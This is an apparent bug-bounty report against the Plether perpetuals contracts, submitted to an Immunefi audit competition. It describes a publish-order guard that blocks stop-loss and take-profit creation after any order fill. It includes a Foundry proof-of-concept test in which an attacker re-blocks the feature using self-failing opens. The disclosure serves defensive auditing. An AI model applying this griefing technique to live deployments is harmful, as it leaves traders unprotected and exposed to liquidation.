# \#99608 [SC-Low] Publish-order check added by the MED-28 fix lets any order fill block take-profit / stop-loss creation for all accounts, leading to griefing

**Submitted on Nov 14th 2026 at 13:28:19 UTC by @maptool for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99608
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - If done before the weekly freeze, an attacker can leave a trader without a stop-loss for the reopen and forcing the trader to either pay the 0.50% fee or carry the position unprotected until reopen with the risk of liquidation.

## Description

## Brief/Intro
After any order execution, `createPositionProtection`, `replacePositionProtection` and
`commitOpenOrderWithProtection` revert for every account until someone posts a newer live price. Order execution advances the Engine mark but not the Oracle's accepted basket, and the guard added by the Cecuro MED-28 fix reverts whenever the accepted basket is older than the Engine mark. On mainnet, traders could not arm or adjust stop-losses after ordinary trading activity, and an attacker could keep the feature blocked at gas cost only.

## Vulnerability Details
The MED-28 fix made the protection book validate against the Oracle's accepted live basket:

```solidity
// PositionProtectionBook.sol:862 _freshProtectionObservation()
IPletherOracle.PriceSnapshot memory current = oracle.getLatestPrice(IPletherOracle.PriceMode.MarkRefresh);
```

That read enforces publish ordering against the Engine mark:

```solidity
// PletherOracle.sol:892 _snapshotFromBasket(..., enforcePublishOrder = true)
uint64 markTime = engine.lastMarkTime();
if (snapshot.publishTime < markTime) {
    revert PletherOracle__PriceOutOfOrder(snapshot.publishTime, markTime);
}
```

The two values diverge on every delayed-order execution:

- The Router installs the order's historical tick as the Engine mark
  (`OrderRouterExecutionSidecar.sol:1059`, `engine_.updateMarkPrice(result.neutralMarkPrice, result.publishTime)`).
- The historical path `_resolveHistoricalOrderBasket` (`PletherOracle.sol:596-643`) never writes `_acceptedBasket`. Only live current-basket resolution does (`PletherOracle.sol:798`).

So after any fill the Engine mark is newer than the accepted basket, and the guard reverts. It is reached from
`createPositionProtection` (`:229`), `replacePositionProtection` (`:295`) and `commitOpenOrderWithProtection`(`:463`). The mark advances even when the executed order fails terminally (for example on slippage).

The feature recovers only when a live basket with a strictly later publish second is installed through `updateMarkPrice`, a liquidation or a protection trigger. The next fill breaks it again.

**Why this is a new bug from a fix, not a known issue.** The MED-28 disposition only describes rejecting arming "when the accepted oracle mark is ahead of, or inconsistent with, the Engine mark". The book's own helper `_acceptedMarkInstalled()` (`:888-895`) treats `acceptedTime < markTime` as valid, so the Engine-ahead state was meant to be harmless; the `getLatestPrice` call reverts before that helper runs. `ORACLE_SYNCHRONIZATION.md` notes that historical execution can advance the Engine without the accepted basket, but nowhere says protection creation fails.


## Impact Details
**Direct impact (all accounts, not one victim).** While the Engine mark is ahead:

- no trader can arm take-profit / stop-loss on an open position;
- no trader can change an existing protection's trigger levels;
- no trader can open a position with protection attached.

**Griefing.** An attacker commits an open with an unreachable price limit and executes it themselves. It fails on slippage, takes no position and returns its own bounty, yet advances the Engine mark and re-blocks everyone. Cost is gas plus the Pyth fee, repeatable about once per second. No attacker is needed in busy markets: normal fills do the same.

**Consequences for traders.**

- Every new position has a forced unprotected window: the protected open is blocked, and the trader's own fill then blocks adding protection afterwards.
- A trader cannot tighten or widen an existing stop, so the old level can trigger an unwanted close.
- Without a stop, an adverse move ends in liquidation (loss of nearly all pledged margin plus the 10 bps charge)
  instead of a close at the chosen level for the 4 bps fee.
- Worst case, before the weekly freeze: protection cannot be created while the oracle is frozen, so a trader blocked beforehand must either pay the 0.50% frozen-close spread to exit (about 108 USDG on 20,000 USDG notional, against about 8 USDG live) or carry the position unprotected into the reopen gap. A liquidation pays the liquidating keeper half of the 10 bps charge, and the frozen spread goes to LPs, so an attacker who runs a keeper or holds LP shares has a financial incentive.

## References
- [Guard](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L862-L886)
- [Publish-order check](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L878-L903)
- [Engine mark update on order execution](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L1053-L1061)
- [Historical basket path (no accepted-basket write)](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L596-L643)
- [Cecuro audit, MED-28 disposition](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)
- [MED-28 fix commit](https://github.com/Plether-Fi/plether-core/commit/8f6cfd3d84d1289aa1209e3b08a06e9bfdf38a0d)


## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/audit/Lead11ProtectionEngineAhead.t.sol` at the frozen commit and run:

```bash
cd packages/perps
forge test --match-path test/audit/Lead11ProtectionEngineAhead.t.sol -vv
```

In-scope contracts are unmodified. Only Pyth and the settlement token are mocked, and the router is the repository's
own test wrapper around the production commit path.

**Test 1, `test_OwnOpenFillBlocksProtectionCreationUntilLiveRefresh`**

1. A live `updateMarkPrice` synchronizes the accepted basket and the Engine mark.
2. The trader opens a position through the router. The accepted basket time is now below `engine.lastMarkTime()`.
3. `createPositionProtection` reverts with `PletherOracle__PriceOutOfOrder`.
4. A newer live basket is posted.
5. Another account's fill lands first; the trader's create reverts again.
6. A refresh followed immediately by the create succeeds.

**Test 2, `test_AttackerReblocksAtGasCostWithSelfFailingOpen`**

1. Same setup, ending with a live refresh.
2. The attacker commits an open with an unreachable limit and executes it themselves.
3. It terminates with `Slippage`; the attacker has no position and an unchanged clearinghouse balance.
4. The trader's `createPositionProtection` reverts again.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

contract Lead11ProtectionEngineAheadTest is BasePerpTest {

    address private constant TRADER = address(0xB111);
    address private constant OTHER = address(0xB112);
    address private constant KEEPER = address(0xC0FFEE11);

    uint256 private constant ENTRY_PRICE = 100_000_000;
    uint256 private constant POSITION_SIZE = 10_000e18;
    uint256 private constant OPEN_MARGIN = 800e6;

    function test_OwnOpenFillBlocksProtectionCreationUntilLiveRefresh() public {
        _fundTrader(TRADER, 5000e6);
        _fundTrader(OTHER, 5000e6);

        // 1. A live refresh installs the same basket in the Oracle and the Engine.
        router.updateMarkPrice(_liveTick(ENTRY_PRICE));
        (,, uint64 acceptedTime) = pletherOracle.getAcceptedBasketMark();
        assertEq(acceptedTime, engine.lastMarkTime(), "live refresh synchronizes both marks");

        // 2. The trader opens through the public router; the fill uses the unique post-commit tick.
        _publicOpen(TRADER);
        (,, acceptedTime) = pletherOracle.getAcceptedBasketMark();
        assertLt(acceptedTime, engine.lastMarkTime(), "historical fill advanced only the Engine mark");

        // 3. Arming TP/SL on the freshly opened position now reverts.
        (bool created, bytes4 selector) = _tryCreate(TRADER);
        assertFalse(created, "protection creation is unavailable right after the trader's own fill");
        assertEq(selector, IPletherOracle.PletherOracle__PriceOutOfOrder.selector, "reverts on publish ordering");

        // 4. A newer live basket restores it...
        vm.warp(vm.getBlockTimestamp() + 1);
        router.updateMarkPrice(_liveTick(ENTRY_PRICE));

        // 5. ...but any other account's ordinary fill landing first breaks it again.
        _publicOpen(OTHER);
        (created, selector) = _tryCreate(TRADER);
        assertFalse(created, "another account's fill re-blocks creation after the refresh");
        assertEq(selector, IPletherOracle.PletherOracle__PriceOutOfOrder.selector);

        // 6. Refresh and create with nothing in between succeeds.
        vm.warp(vm.getBlockTimestamp() + 1);
        router.updateMarkPrice(_liveTick(ENTRY_PRICE));
        (created,) = _tryCreate(TRADER);
        assertTrue(created, "creation works only directly after a live refresh");
    }

    /// @dev A third party re-blocks creation at gas cost only: a self-executed open that fails its own slippage
    ///      limit takes no position and gets its bounty back, yet still advances the Engine mark.
    function test_AttackerReblocksAtGasCostWithSelfFailingOpen() public {
        _fundTrader(TRADER, 5000e6);
        _fundTrader(OTHER, 5000e6);
        router.updateMarkPrice(_liveTick(ENTRY_PRICE));
        _publicOpen(TRADER);
        vm.warp(vm.getBlockTimestamp() + 1);
        router.updateMarkPrice(_liveTick(ENTRY_PRICE));

        uint256 attackerBefore = clearinghouse.balanceAssets(OTHER);
        vm.prank(OTHER);
        uint64 orderId = router.commitOrder(CfdTypes.Side.SHORT, POSITION_SIZE, OPEN_MARGIN, 1, false);
        bytes[] memory data = _mockPythUpdateData(ENTRY_PRICE);
        vm.prank(OTHER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
        assertEq(uint256(result.terminalReason), uint256(OrderV3Types.TerminalReason.Slippage), "self-failing open");
        (uint256 attackerSize,,,,,,) = engine.positions(OTHER);
        assertEq(attackerSize, 0, "attacker takes no position");
        assertEq(clearinghouse.balanceAssets(OTHER), attackerBefore, "attacker pays no fee and keeps its bounty");

        (bool created, bytes4 selector) = _tryCreate(TRADER);
        assertFalse(created, "victim's creation is blocked again");
        assertEq(selector, IPletherOracle.PletherOracle__PriceOutOfOrder.selector);
    }

    function _publicOpen(
        address account
    ) private {
        vm.prank(account);
        uint64 orderId = router.commitOrder(CfdTypes.Side.SHORT, POSITION_SIZE, OPEN_MARGIN, ENTRY_PRICE, false);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, _mockPythUpdateData(ENTRY_PRICE));
        assertEq(uint256(result.status), uint256(OrderV3Types.LifecycleStatus.Executed), "open failed");
    }

    function _tryCreate(
        address account
    ) private returns (bool created, bytes4 selector) {
        IPositionProtectionActions actions = IPositionProtectionActions(address(router.positionProtectionBook()));
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.takeProfitTriggerPrice = 110_000_000;
        params.stopLossTriggerPrice = 80_000_000;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        vm.prank(account);
        try actions.createPositionProtection(params) returns (uint64) {
            created = true;
        } catch (bytes memory reason) {
            selector = bytes4(reason);
        }
    }

    function _liveTick(
        uint256 price
    ) private returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](2);
        bytes32[2] memory ids = [BASE_PYTH_FEED_A, BASE_PYTH_FEED_B];
        for (uint256 i; i < 2; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: ids[i],
                price: MockPyth.MockPrice({
                    price: SafeCast.toInt64(SafeCast.toInt256(price)),
                    conf: 0,
                    expo: int32(-8),
                    publishTime: vm.getBlockTimestamp(),
                    prevPublishTime: vm.getBlockTimestamp() - 1
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

}
```
